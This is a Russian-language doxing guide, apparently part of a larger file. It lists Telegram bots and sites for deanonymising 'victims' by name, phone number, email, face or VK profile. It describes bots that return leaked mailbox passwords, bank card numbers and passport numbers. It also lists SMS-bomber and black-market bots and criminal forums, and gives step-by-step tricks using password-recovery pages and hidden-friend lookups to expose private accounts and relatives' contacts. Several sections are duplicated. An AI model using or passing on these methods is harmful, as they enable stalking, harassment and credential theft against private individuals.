соц сети по отдельному, не вбивая все попросту в Яндекс. Также можно проверить Ф.И.О в справочных \nсайтах города жертвы, в надежде найти адрес, а по нему и остальных родственников. \n\n\nОстальные сервисы/сайты/боты которые могут в поиске информации на жертву:\n1 - nuga.app (По номеру телефона 100% выдаст информацию жертвы).\n2 - lampyre.io (Поиск по номеру, почте, гугл айди, и т.д) - Способ бесконечного пользования: \nБерём почту на https://temp-mail.org/ru/ и регистрируем аккаунт. При регистрации нам дадут 100 футонов, это 4 попытки. Советуем использовать VPN при смене аккаунта. \n3 - @PasswordSearchBot (Telegram бот. Выдаст пароли почты которые находяться в утечке).\n4 - Глаз Бога (Telegram бот. Расширенные функции для поиска по Ф.И.О, номеру, почте, паролю, и многому другому).\n5 - Боты в TG с базами серверов MCPE \\\\ VIMEWORLD:\n@checkmcbot\n@vimebasebot\n\n\n\n\n           50 сайтов для днн \n————————————————\n\n\nhttps://rulait.github.io/vk-friends-saver/ \nhttp://archive.is/ \nhttp://peeep.us/\nhttps://archive.org/\nhttp://www.cachedpages.com/ \nhttp://skyperesolver.net/ \nhttps://yip.su\nhttps://vedbex.com/tools/iplogger \nhttp://phoneradar.ru/phone/ \nhttp://afto.lol/ \nhttp://zaprosbaza.pw/ \nhttps://radaris.ru/\nhttps://service.nalog.ru/inn.html \nhttp://services.fms.gov.ru/info-service.htm?sid=2000 \nhttps://2ch.hk/b/ \nhttp://sonetel.com/\nhttp://psi-im.org/ \nhttps://discordapp.com/ \nhttp://viber.com/\nhttp://www.vpnbook.com/\nhttps://www.vpnkeys.com/ \nhttps://www.tcpvpn.com/ \nhttps://prostovpn.org/ \nhttps://lightvpn.pro/\nhttp://spys.ru/\nhttps://insorg.org\nhttp://sockshub.net/ \nhttp://www.cekpr.com/decode-short-url/ \nhttps://temp-mail.org/\nhttps://perfectmoney.is/\nhttps://blockchain.info/\nhttps://blackbiz.ws/ \nhttps://darkwebs.cc/\nhttps://zblock.co/ \nhttps://newage-bank.com/\nhttp://upbitcoin.com/\nhttp://tomygame.com/\nhttps://freebitco.in/\nhttp://gr8.cc/\n\n\nИСПОЛЬЗОВАТЬ VPN!!! \n————————————————\n\n\nПоиск телефона/почты родителей\n. \nДля того чтобы найти почту нам нужны хотя бы одна из этих вещей: Профиль ВК, Профиль ОК, ФИ + ДР\nЗаметим, что не всегда получится вытащить, но у меня в большинстве случаев получалось. \n\n\n1. Идем на сайт восстановления пароля ok.ru (https://m.ok.ru/dk?st.cmd=accountRecoverFeedbackForm) и достаем в некоторых случаях часть почты и телефона. Если почту легко угадать - угадываем. Если ничего не получилось - идем дальше\n2. Идем в бота (https://t.me/ssb_russian_probiv_bot) и если профилю больше 5-6 лет и он был активен - то отправляем ссылку на вк ему. Выдаст почту и телефон - чекает по базам ВК.\n3. Последний способ это способ связанный с my.mail.ru . Для начала регистрируемся в майл ру. Нажимаем на поиск людей (https://my.mail.ru/my/search_people?) и вбиваем Фамилию Имя. Фильтруем и в некоторых случаях получаем ссылку по типу my.mail.ru/домен/ник. Получается почта ник@домен.ру\n\n\n\n\n\n',
            "Деанон 3": '\n1. Всегда смотри внимательно на то, что тебе в гугле выходит при запросе. Порой даже мелочь может быть решением. \n2. Не думай, что деанонимизация представляет из себя что-то сверх умное и сложное. Каждый деанон строится на ошибках самого человека, ведь сли бы он сам не создал канал, ничего может и не было. \n3. Не советую тебе заниматься деанонами, если кто-то знает о тебе что-либо. Ты должен быть защищен, чтобы в случае чего ты сам не стал жертвой. \n4. К каждому человеку свой подход. На кого то уходит по 2-3 дня, кто-то деанонится за 5-10 минут\nХ-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х\n1. Несколько полезных сайтов.\n[!] Содержимое раздела:\n\n• https://checkusernames.com/ - Поиск по никнеймам, в него входят огромное колл-во сайтов.\n• https://online-vk.ru/ - Покажет скрытых друзей, так же, покажет вам друзей из закрытого профиля.\n• https://220vk.com/ - Сайт, который сможет показать скрытых друзей и не только.\n• https://findclone.ru/ - Поиск по "клонам", определяет внешность человека, тем самым выдает страницу ВКонтакте на пользователя с максимально похожими чертами лица.\n• Keyword Tool (https://keywordtool.io/)\nПлатформа показывает ключевые слова по введенному запросу на любом языке и по любой стране. В некоторых запросах даже видно, насколько они популярны, хотя эта услуга платная. Можно искать ключевые слова по Google, YouTube, Twitter, Instagram, Amazon, eBay, Play Store, Bing.\nИща по Google, можно, например, выбрать ключевые выражения, содержащие в себе вопросительные слова или предлоги. А слева есть фильтры, где можно искать по ключевым словам уже в получившейся выдаче.\n• https://vk.com/tool42 - Приложение ВК, можно достать немного информации.\n• https://www.kody.su/check-tel#text - На данной странице можно определить сотового оператора и регион (или город и страну) по любому номеру телефона в России или в мире.\n• https://vk.watch/ - история профилей ВКонтакте, требуется подписка.\nХ-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х\n\n2. Телефон\nL Поиск по номеру телефона\n[!] Содержимое раздела:\n\n• Lampyre (https://account.lampyre.io/email-and-phone-lookup) — веб\nверсия поиска по любому номеру телефона, поиск по аккаунтам и телефонной книге - от себя: полезная вещь в osint-сфере, не раз спасала меня.\n• Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах - от себя: Сайт хороший, но я думаю, что бот в телеграмме будет на много удобнее для Вас.\n• Truecaller (https://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона - от себя: Вещь годная, но долго возиться\n• Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона - Иногда нужен VPN\n• @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит\n• Spravnik (https://spravnik.com/) — поиск по городскому номеру телефона, найдет ФИО и адрес\n• @info_baza_bot (https://t.me/@info_baza_bot) — поиск в базе данных\n• @find_caller_bot (https://t.me/@find_caller_bot) — найдет ФИО владельца номера телефона\n• @usersbox_bot (https://t.me/@usersbox_bot) — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер\n• @getbank_bot (https://t.me/@getbank_bot) — дает номер карты и полное ФИО клиента банка\n• @eyegodsbot - Телеграмм бот, часто радовал меня, есть бесплатные пробивы по машинам, лицу, номеру телефона, есть платный контент.\n• @egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта; учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы. Базы данных сами понимаете откуда. Ограничений бота – нет.\n• @mnp_bot \n• @xinitbot \n• @black_triangle_tg \nХ-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х\n3. Лицо\nL Поиск лицу\n[!] Содержимое раздела:\n\n• FindTwin face search demo + @VkUrlBot (бот подобие сайта)— https://findclone.ru/\n• Face search • PimEyes — https://pimeyes.com/en/\n• Betaface free online demo — Face recognition, Face search, Face analysis — http://betaface.com/demo_old.html\n• VK.watch – история профилей ВКонтакте — https://vk.watch/\n\nХ-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х\n\n4. Поисковые системы\nL Поисковые Cистемы Людей:\n[!] Содержимое раздела:\n\n• https://www.peekyou.com/\n• https://pipl.com/\n• https://thatsthem.com/\n• https://hunter.io/\n• https://www.beenverified.com/\n\nХ-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х\n5. Ip-адрес.\nL Проверка айпи адресов:\n[!] Содержимое раздела:\n\n• https://whatismyipaddress.com/\n• http://www.ipaddresslocation.org/\n• https://lookup.icann.org/\n• https://www.hashemian.com/whoami/\n\nХ-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х\n\nПоиск по EMAIL:\n- https://haveibeenpwned.com/\n- https://hacked-emails.com/\n- https://ghostproject.fr/\n- https://weleakinfo.com/\n- https://pipl.com/\n- https://leakedsource.ru/\n\n▫️ 🤖Боты\n├ @Quick_OSINT_bot — позволяет проводить анализ профиля, покажет историю собщений пользователя, выгрузит его фотографии, а еще найдет телефон, email, как владелец записан в контактах, базах данных и досках объявлений, аккаунты в соц. сетях и мессенджерах, в каких чатах состоит, документы, адреса и многое другое\n├ @FindNameVk_bot — история изменений имени аккаунта\n├ @GetPhone_bot — поиск в утекших базах\n├ @InfoVkUser_bot — бот покажет наиболее частые места учебы друзей аккаунта\n└ @VKUserInfo_bot — бот скачивает всю информацию об аккаунте\n\n⚙️ Ресурсы\n├ 220vk.com (https://220vk.com/) — определит средний возраст друзей, скрытых друзей, города друзей, дата регистрации и т.д\n├ archive.is (https://archive.is/) — архивированная страница аккаунта\n├ archive.org — покажет архивированную версию аккаунта\n├ searchlikes.ru (https://searchlikes.ru/) — найдет где есть лайки и комментарии, дает статистику друзей\n├ tutnaidut.com (https://tutnaidut.com/) — информация аккаунта несколько лет назад\n├ vk.watch (https://vk.watch/) — покажет историю аккаунта с 2016 года, ограниченная информация, покажет фото в низком качестве, можно уменьшить масштаб фото, тем самым распознать что там изображено\n├ vk5.city4me.com (https://vk5.city4me.com/) — cтатистика онлайн активности, скрытые друзья\n├ vkdia.com (https://vkdia.com/) — определит с кем из друзей переписывается человек\n├ vk-express.ru (https://vk-express.ru/) — слежка за аккаунтом, после добавления будут доступны аватары, лайки, комментарии, друзья группы и т.д.\n├ vk-photo.xyz (https://vk-photo.xyz/) — частные фото аккаунта\n├ yasiv.com (http://yasiv.com/vk) — создает граф из друзей аккаунта, после регистрации добавьте в граф аккаунт того кого хотите просмотреть\n└ yzad.ru (https://yzad.ru/) — находит владельца группы\n\n🔧 Приложения\n├ InfoApp (https://vk.com/app7183114) — найдет созданные группы, упоминания в комментариях, созданные приложения и комментарии к фото\n└ VKAnalysis (https://github.com/migalin/VKAnalysis) — анализ круга общения, текста, фото, онлайна и интересов аккаунта\n\n⚙️ Поиск через URL\n├ https://online-vk.ru/pivatfriends.php?id=123456789 — поиск друзей закрытого аккаунта, замените 123456789 на ID аккаунта VK\n├ https://vk.com/feed?obj=123456789&q=&section=mentions — упоминания аккаунта, замените 123456789 на ID аккаунта VK\n├ https://ruprofile.pro/vk_user/id123456789 — сохраненная информация об аккаунте за 2017-18 год, замените 123456789 на ID аккаунта VK\n├ https://rusfinder.pro/vk/user/id123456789 — сохраненная информация об аккаунте за 2017-18 год, замените 123456789 на ID аккаунта VK\n└ https://my.mail.ru/vk/123456789 — найдет аккаунт на Мой Мир, замените 123456789 в ссылке на ID аккаунта\n\n\n\n🆗 Как узнать номер телефона аккаунта VK через Одноклассники\n\n1. В ВК добавьте аккаунт в друзья\n2. Перейдите в Одноклассники и откройте раздел мои друзья\n3. Нажмите на кнопку \'добавить друзей из ВК\'\n4. Если аккаунт нашелся, то скопируйте ссылку на найденный аккаунт ОК\n5. Перейдите по ссылке - https://ok.ru/password/recovery и выберите восстановить через профиль\n6. Вставьте в поле ссылку которую вы скопировали на профиль и нажмите искать\n\nВ результате вы получите часть номера телефона и e-mail адреса\n\n\n\n👨‍👩‍👦 Как найти друзей приватного аккаунта VK\n\n1. Скопируйте ID аккаунта у которого хотите узнать друзей\n2. Откройте Google, и вставьте туда этот ID, например: id123456\n3. В результатах поиска откройте такие сайты как facestrana.ru или boberbook.ru или vkanketa.ru или vkglobal.ru или другой который похож на эти\n4. На сайте будет анкета другого человека(это один из друзей), скопируйте ID этого аккаунта(ID в пункте основная информация)\n5. Перейдите по ссылке 220vk.com - https://220vk.com/commonFriends\n6. В первом поле вставьте ID друга, а во втором ID приватного аккаунта\n7. Нажмите кнопку "искать общих друзей"\n\nЕсли друзей не нашлось или их мало, воспользуйтесь ID другого друга из результатов поиска в Google\n\n\n😎 Как найти владельца сообщества VK\n\nЧерез приложение\n└ Откройте VKinfo(https://vk.com/app7183114) и впишите ссылку на сообщество\n\nЧерез сайт\n└ Откройте http://yzad.ru и дайте ссылку на паблик\n\nЧерез документы\n1. Откройте раздел документы в сообществе\n2. Откройте исходный код страницы (Ctrl+U)\n3. Откройте окно поиска(Ctrl+F)\n4. В окне поиска введите имя файла которое есть в сообществе. В результатах должна быть строка с именем файла, пример:\n[["439837850","xls","OkiDoki.xls","806 КБ, 01 октбр 2020 в 17:59","-27921417",0,"","138633190",false,1,""]]\nгде OkiDoki.xls имя файла, а 138633190 ID пользователя загрузившего этот файл, как правило это ID админа\n\n\n🎂 Как узнать скрытый возраст владельца аккаунта VK\n\n└ Установите расширение для браузера VKopt скачав здесь - https://vkopt.net/download/\n\n\nДополнения:\n\n\n====================================================================================================================================================\nhttps://t.me/HowToFind - помогает найти информацию по известным данным. Очень мощная штука. \nhttps://t.me/InstaBot - скачивает фото, видео, аватарки, истории из Instagram \nhttps://t.me/VKUserInfo_bot - Удобный способ спарсить открытую информацию аккаунта ВК по id \nhttps://t.me/InfoVkUser_bot - позволяет провести анализ друзей профиля и выдает город + ВУЗ \nhttps://t.me/Smart_SearchBot - поиск информации по номеру телефона \nhttps://t.me/egrul_bot - сведения о государственной регистрации юрлиц и ИП \nhttps://t.me/buzzim_alerts_bot - бот для мониторинга открытых каналов и групп в Telegram \nhttps://t.me/callcoinbot - звонилка\nhttps://t.me/TempGMailBot - выдает временный адрес [домен: ....gmail.com] \nhttps://t.me/DropmailBot - выдает временный адрес [домен: ....laste.ml] \nhttps://t.me/fakemailbot - выдает временный адрес [домен: ....hi2.in] \nhttps://t.me/etlgr_bot - временые адреса c возможностью повторного использования и отправки сообщений.\nhttps://t.me/remindmemegabot - хорошая напоминалка \nhttps://t.me/MoneyPieBot - поможет не забыть о ваших долгах \nhttps://t.me/SmsBomberTelegram_bot\nhttps://t.me/SmsB0mber_bot\nhttps://t.me/smsbomberfreebot\nhttps://t.me/flibustafreebookbot - библиотека книг (флибуста, https://flibusta.appspot.com/) \nhttps://t.me/Instasave_bot - скачивает видео из Instagram. Бот справляется всего за несколько секунд — достаточно отправить ссылку, и он скачивает файл самостоятельно. \nhttps://t.me/red_cross_bot - бот накладывает красный крест на любое изображение, отправленное ему. \nhttps://t.me/vk_bot - бот, позволяющий настроить интеграцию с VKontakte. \nhttps://t.me/VoiceEffectsBot - меняет тон вашей голосовухи, можно добавить эффекты итп.\nhttps://t.me/roundNoteBot - бот, который превращает любое видео в кругляшку, будто кто то ее сам снял.\nhttps://t.me/ParserFree2Bot - юзабельный бесплатный парсер чатов, на 100% выполняющий свою функцию \nhttps://t.me/DotaGosuBot - Бот, генерирует оскорбления. \nhttps://t.me/URL2IMGBot - Бот делает скриншот сайта, по отправленной вами ссылке. [​IMG] \nhttps://t.me/imgurbot_bot - ТГ бот, кидаешь ему картинку, он создаёт ссылку на имгур. [​IMG]\n====================================================================================================================================================\n\n====================================================================================================================================================\n@Smart_SearchBot - Помогает найти дополнительную информацию, относительно телефонного номера, id ВКонтакте, email, или ИНН юр./физ. лица.\n@Getcontact_Officalbot – показывает как номер телефона записан в контактах других людей\n@info_baza_bot – база данных номеров телефона, email\n@get_caller_bot - Ищет только по номеру телефона. На выходе: ФИО, дата рождения, почта и «ВКонтакте»\n@OpenDataUABot – по коду ЕДРПОУ возвращает данные о компании из реестра, по ФИО — наличие регистрации ФОП\n@YouControlBot - полное досье на каждую компанию Украины\n@mailseatchbot - По запросу пробива e-mail выдает открытый пароль от ящика если тот есть в базе\n@Dosie_Bot – создатели «Досье» пошли дальше и по номеру телефона отдают ИНН и номер паспорта\n@UAfindbot – База данных Украины\n====================================================================================================================================================\n\n====================================================================================================================================================\n@FindClonesBot – Поиск человека по фото\n@MsisdnInfoBot - Получение сведений о номере телефона\n@AVinfoBot - Поиск сведений об автовладельце России\n@antiparkon_bot - Поиск сведений об автовладельце\n@friendsfindbot - Поиск человека по местоположению\n@egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта России\n@last4mailbot (Mail2Phone) — по почте показывает статус: есть ли аккаунт в «Одноклассниках» и «Сбербанке», или нет.\n@bmi_np_bot - По номеру телефона определяет регион и оператора.\n@whoisdombot - пробивает всю основную информацию о нужном домене (адрес сайта), IP и другое.\n@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на личность в FaceBook.\n@buzzim_alerts_bot - Ищет упоминания ников/каналов в чатах статьях.\n@avinfobot - по вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru.\n@VKUserInfo_bot — по ID «ВКонтакте» возвращает расширенную информацию о профиле.\n@GetGmail_bot (GetGmail — OSINT email search) — по gmail-почте отдает Google ID, зная который, можно получить архив альбомов Google.\n@telesint_bot (TeleSINT) — информация об участии пользователей Telegram в открытых и закрытых группах. Поиск — по нику.\n@iptools_robot — бот для быстрого поиска информации о домене и ip адресе. Бот конечно же бесплатный\n@phone_avito_bot — найдет аккаунт на Авито по номеру телефона России. Еще бот показывает данные из GetContact.\n@Dosie_bot – теперь бот дает еще больше информации. Для нового аккаунта 3 бесплатные полные попытки поиска.\n====================================================================================================================================================\n\n====================================================================================================================================================\n@egrul_bot - Данный бот пробивает Конторы/ИП. По вводу ФИО/Фирмы предоставляет ИНН объекта; \nучредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы.\n\n@get_kontakt_bot- Бот пробивает номер мобильного телефона. \nКак записан запрашиваемый контакт в разных телефонных книжках ваших товарищей/подруг/коллег.\n\n@mailsearchbot - По запросу пробива e-mail бот выдает открытый «password» от ящика. Очень огромная/крутая БД\n\n@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на личность в Фэйсбуке.\n\n@buzzim_alerts_bot - Поисковая система по платформе Telegram. \nИщет упоминания ников/каналов в чатах статьях. Присутствует функция оповещения, если что-то где-то всплывёт.\n\n@AvinfoBot - Бот, который по вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru.\n====================================================================================================================================================\n\n====================================================================================================================================================\nБоты черных рынков: \n\n@Darksalebot\n\n@SafeSocks_Bot\n\n@flood_sms_bot\n====================================================================================================================================================\n\n====================================================================================================================================================\n1. EGRUL\n@egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта, \nучредителей бизнеса/партнеров и отчет налоговую декларацию. \nИ наоборот: поиск по ИНН выдаст ФИО/конторы. Работает по РФ.\n\n2. BMI NP\n@bmi_np_bot - По номеру телефона определяет регион и оператора.\nИнтересно, что этот бот определяет даже новые номера и определяет номера, которые были перенесены совершенно недавно.\n\n3. WHOIS DOMAIN\n@whoisdombot - Пробивает всю основную информацию о нужном домене (адрес сайта), IP и подобное.\n\n4. MAILSEARCH\n@mailsearchbot - По запросу e-mail выдает открытый пароль от ящика, если тот есть в базе. \nОчень серьезная база данных. Висит давно, 1.5 млрд учёток, год актуальности ~<2014г.. \nУдобно составлять/вычислять персональные чарсеты с помощью, например, JTR.\n\n5. GETFB\n@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на профиль в FaceBook.\n\n6. BUZZIM ALERPTS\n@buzzim_alerts_bot - Поисковая система по платформе Telegram. Ищет упоминания ников/каналов в чатах статьях. \nПрисутствует функция оповещения, если что-то где-то всплывёт. \nНапример, можно посмотреть какие каналы разнесли твои посты с Telegram, проверить ник юзера, где он еще трепался.\n\n7. AVINFO\n@avinfobot - По вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru. \nВ демо-режиме бесплатно доступно несколько таких поисков/отчетов. Ценник за функционал приличный, \nнекоторые хитрожопые юзеры только ради этого бота сбрасывают свой аккаунт в Telegram, \nчтобы бесплатно пробивать своих жертв (бесконечное удаление/регистрация учетки на один и тот же номер телефона).\n\n8. HOWTOFIND\n@howtofind_bot - Робот разведчик. Подскажет секреты и приемы OSINT.\n\n9. SMART SEARCH\n@smart_searchbot - Помогает найти дополнительную информацию, относительно телефонного номера, id ВКонтакте, email, или ИНН юр./физ. лица.\n\n\n\n====================================================================================================================================================\nКак найти аккаунт в ВК зная e-mail адрес от Яндекса \n\n1. Уберите из адреса почты @yandex.ru, у вас останется логин \n2. Вставьте логин в ссылку https://music.yandex.com/users/LOGIN и перейдите по ссылке \n3. Если аккаунт нашелся, то откройте исходный код страницы (Ctrl+U) \n4. Откройте поиск по странице (Ctrl+F) и введите туда vk.com \n\nРаботает не со всеми аккаунтами и игнорируйте ссылку на страницу VK Яндекс Музыки!\nКак по адресу Яндекс почты найти отзывы на картах Яндекса \n\n1. Уберите из адреса почты @yandex.ru, у вас останется логин \n2. Вставьте логин в ссылку https://yandex.ru/collections/user/LOGIN \n3. Откройте исходный код страницы (Ctrl+U) \n4, Откройте поиск по странице (Ctrl+F) и введите туда public_id \n5. В результатах поиска будет 2 таких словосочетания, найдите второе \n6. После второго public_id идет набор цифр и букв (например: c48fhxw0qppa50289r5c9ku4k4) которое нужно скопировать. \n7. Вставьте скопированный текст в этот URL - https://yandex.ru/user/<Public_id> (замените <Public_id> на то что вы скопировали) и откройте эту ссылку\n==================================================================================================================================================== \n\nОЧЕНЬ ХОРОШИЙ САЙТ, КОТОРЫЙ СОДЕРЖИТ ТОННЫ И ТОННЫ ДОКСИНГОВЫХ ИНСТРУМЕНТОВ https://cybertoolbank.cc p.s про него мало кто знает (на английском)\n\nТри самых ахуенных сайта через которые ты можешь дальше развиваться в данной сфере:\nhttps://xss.is/\nhttp://probiv.one/\nhttps://rutor.wtf\n\nhttps://spyse.com/ — поисковая система по кибербезопасности для получения технической информации, которая обычно используется некоторыми хакерами в киберразведке.\n\nКак найти аккаунт в ВК зная e-mail адрес от Яндекса \n\n1. Уберите из адреса почты @yandex.ru, у вас останется логин \n2. Вставьте логин в ссылку https://music.yandex.com/users/LOGIN и перейдите по ссылке \n3. Если аккаунт нашелся, то откройте исходный код страницы (Ctrl+U) \n4. Откройте поиск по странице (Ctrl+F) и введите туда vk.com \n\nРаботает не со всеми аккаунтами и игнорируйте ссылку на страницу VK Яндекс Музыки!\nКак по адресу Яндекс почты найти отзывы на картах Яндекса \n\n1. Уберите из адреса почты @yandex.ru, у вас останется логин \n2. Вставьте логин в ссылку https://yandex.ru/collections/user/LOGIN \n3. Откройте исходный код страницы (Ctrl+U) \n4, Откройте поиск по странице (Ctrl+F) и введите туда public_id \n5. В результатах поиска будет 2 таких словосочетания, найдите второе \n6. После второго public_id идет набор цифр и букв (например: c48fhxw0qppa50289r5c9ku4k4) которое нужно скопировать. \n7. Вставьте скопированный текст в этот URL - https://yandex.ru/user/<Public_id> (замените <Public_id> на то что вы скопировали) и откройте эту ссылку.\n==================================================================================================================================================== \n\n\nПоиск контрагента\n\nhttps://service.nalog.ru/zd.do - Сведения о юридических лицах, имеющих задолженность по уплате налогов и/или не представляющих налоговую отчетность более года\nhttps://service.nalog.ru/addrfind.do - Адреса, указанные при государственной регистрации в качестве места нахождения несколькими юридическими лицами\nhttps://service.nalog.ru/uwsfind.do - Сведения о юридических лицах и индивидуальных предпринимателях, в отношении которых представлены документы для государственной регистрации\nhttps://service.nalog.ru/disqualified.do - Поиск сведений в реестре дисквалифицированных лиц\nhttps://service.nalog.ru/disfind.do - Юридические лица, в состав исполнительных органов которых входят дисквалифицированные лица\nhttps://service.nalog.ru/svl.do - Сведения о лицах, в отношении которых факт невозможности участия (осуществления руководства) в организации установлен (подтвержден) в судебном порядке\nhttps://service.nalog.ru/mru.do - Сведения о физических лицах, являющихся руководителями или учредителями (участниками) нескольких юридических лиц\n\nhttps://fedresurs.ru/ - Единый федеральный реестр юридически значимых сведений о фактах деятельности юридических лиц, индивидуальных предпринимателей и иных субъектов экономической деятельности \n\nhttp://rkn.gov.ru/mass-communications/reestr/ – реестры Госкомнадзора.\nhttp://www.chinacheckup.com/ – лучший платный ресурс по оперативной и достоверной верификации китайских компаний.\nhttp://www.dnb.com/products.html - модернизированный ресурс одной из лучших в мире компаний в сфере бизнес-информации Dun and Bradstreet.\nhttp://www.imena.ua/blog/ukraine-database/ – 140+ общедоступных электронных баз данных Украины.\nhttp://www.fciit.ru/ – eдиная информационная система нотариата России.\nhttp://gradoteka.ru/ – удобный сервис статистической информации по городам РФ.\nhttp://www.egrul.ru/ - сервис по поиску сведений о компаниях и директорах из государственных реестров юридических лиц России и 150 стран мира.\nhttp://disclosure.skrin.ru - уполномоченное ФСФР (Федеральной службой по финансовым рынкам) на раскрытие информации на рынке ценных бумаг агентство ЗАО “СКРИН”.\nhttp://1prime.ru/docs/product/disclosure.html – уполномоченное ФСФР (Федеральной службой по финансовым рынкам) на раскрытие информации на рынке ценных бумаг агентство ЗАО “Прайм-ТАСС”.\nhttps://www.cbr.ru/ - информация ЦБ по бюро кредитных историй, внесенных в государственный реестр.\nhttp://www.gks.ru/accounting_report – предоставление данных бухгалтерской отчетности по запросам пользователей от Федеральной службы государственной статистики.\nhttp://www.tks.ru/db/ – таможенные онлайн базы данных.\nhttp://tipodop.ru/ - очередной каталог предприятий, организаций в России.\nhttp://www.catalogfactory.org/ – организации России – финансовые результаты, справочные данные и отзывы. Данные в настоящее время доступны по 4,8 млн.организаций.\nhttp://pravo.ru/ – справочно-информационная система, включающая в настоящее время 40 млн. законодательных, нормативных и поднормативных актов Российской Федерации.\nhttp://azstatus.ru/ – информационная база данных, в которой содержится информация обо всех предпринимателях Российской Федерации, а также информация о российских компаниях (юридические лица). Всего в справочнике более 10 миллионов записей.\nhttp://seldon.ru/ – информационно-аналитическая система, значительно упрощающая и систематизирующая работу с закупками.\nhttp://www.reestrtpprf.ru/ – реестр надежных партнеров от системы Торгово-промышленных палат в Российской Федерации.\nhttp://iskr-a.com/ – сообщество безопасников и платформа для информационного взаимодействия в одном флаконе.\nhttp://www.ruscentr.com/ - реестр базовых организаций российской экономики, добросовестных поставщиков и бюджетоэффективных заказчиков (организаций).\nhttps://www.aips-ariadna.com/ – антикриминальная онлайн система учета по России и СНГ. Относится к тому же ценовому сегменту, что и «Контур Фокус» и т.п., и отличается от других систем большим уклоном в судебные и правоохранительные данные. Ориентирована прежде всего на службу безопасности.\nhttp://188.254.71.82/rds_ts_pub/ – единый реестр зарегистрированных деклараций РФ.\nhttp://croinform.ru/index.php?page=index – сервис проверки клиентов, конкурентов, партнеров и контрагентов в режиме реального времени 24/7, в т.ч. со смартфона. Цены вполне человеческие. Сервис знаменитого Кроноса.\nhttp://www.zakupki.gov.ru/epz/main/public/home.html – официальный сайт Российской Федерации для размещения информации о размещении заказов на поставки товаров, выполнение работ, оказание услуг.\nhttp://rostender.info/ – ежедневная рассылка новых тендеров в соответствии с отраслевыми и региональными настройками.\nhttp://pravo.fso.gov.ru/ – государственная система правовой информации. Позволяет быть в курсе всех новых правовых актов. Имеет удобный поисковик.\nhttp://www.bicotender.ru/ - самая полная поисковая система тендеров и закупок по России и странам СНГ.\nhttp://sophist.hse.ru/ – единый архив экономических и социологических данных по российской Федерации от НИУ ВШЭ.\nhttp://www.tenderguru.ru/ – национальный тендерный портал, представляет собой единую базу государственных и коммерческих тендеров с ежедневной рассылкой анонсов по объявленным тендерам.\nhttp://www.moscowbase.ru/ - поддерживаемые в состоянии постоянной актуальности адресно-телефонные базы данных по компаниям Москвы и России. Уникальным продуктом компании являются базы данных новых компаний, появившихся в течение двух последних кварталов. В данные включается вся стандартная информация, предоставляемая платными онлайн базами, плюс актуальные внутренние телефоны и e-mail.\nhttp://www.credinform.ru/ru-RU/globas - информационно-аналитическая система ГЛОБАС – I содержит данные о семи миллионах компаний. Предназначена для комплексной информационной поддержке бизнеса и создания комплексных аналитических отчетов.\nhttp://www.actinfo.ru/ – отраслевой бизнес-справочник предприятий России по их актуальным почтовым адресам и контактным телефонам. Единственный справочник, который включает контактные данные по предприятиям, созданным в предыдущем квартале.\nhttp://www.sudrf.ru/ -государственная автоматизированная система РФ «Правосудие».\nhttp://docs.pravo.ru/ – справочно-правовая система Право.ру. Предоставляет полный доступ к нормативным документам любых субъектов Российской Федерации, а также к судебной практике арбитражных судов и мнениям экспертов любых юридических областей. Ежемесячная плата для работы с полной базой документов составляет 500 руб.\nhttp://www.egrul.com/ – платные и бесплатные сервисы поиска по ЕГРЮЛ, ЕГРИП, ФИО, балансам предприятий и др. параметрам. Одно из лучших соотношений цены и качества.\nhttp://www.fedresurs.ru/ – единый федеральный реестр сведений о фактах деятельности юридических лиц.\nhttp://www.findsmi.ru/ – бесплатный сервис поиска данных по 65 тыс. региональных СМИ.\nhttp://hub.opengovdata.ru/ – хаб, содержащий открытые государственные данные всех уровней, всех направлений. Проект Ивана Бегтина.\nhttp://www.ruward.ru/ – ресурс агрегатор всех рейтингов Рунета. В настоящее время уже содержит 46 рейтингов и более 1000 компаний из web и PR индустрии.\nhttp://www.b2b-energo.ru/firm_dossier/ - информационно-аналитическая и торгово-операционная система рынка продукции, услуг и технологий для электроэнергетики.\nhttp://opengovdata.ru/ – открытые базы данных государственных ресурсов\nhttp://bir.1prime.ru/ – информационно-аналитическая система «Бир-аналитик» позволяет осуществлять поиск данных и проводить комплексный анализ по всем хозяйствующим субъектам России, включая компании, кредитные организации, страховые общества, регионы и города.\nhttp://www.prima-inform.ru/ – прямой доступ к платным и бесплатным информационным ресурсам различных, в т.ч. контролирующих организаций. Позволяет получать документы и сводные отчеты, информацию о российских компаниях, индивидуальных предпринимателях и физических лицах, сведения из контролирующих организаций. Позволяет проверять субъектов на аффилированность и многое другое.\nhttp://www.integrum.ru/ –портал для конкурентной разведки с самым дружественным интерфейсом. Содержит максимум информации, различных баз данных, инструментов мониторинга и аналитики. Позволяет компании в зависимости от ее нужд, размеров и бюджета выбирать режим пользования порталом.\nwww.spark-interfax.ru – портал обладает необходимой для потребностей конкурентной разведки полнотой баз данных, 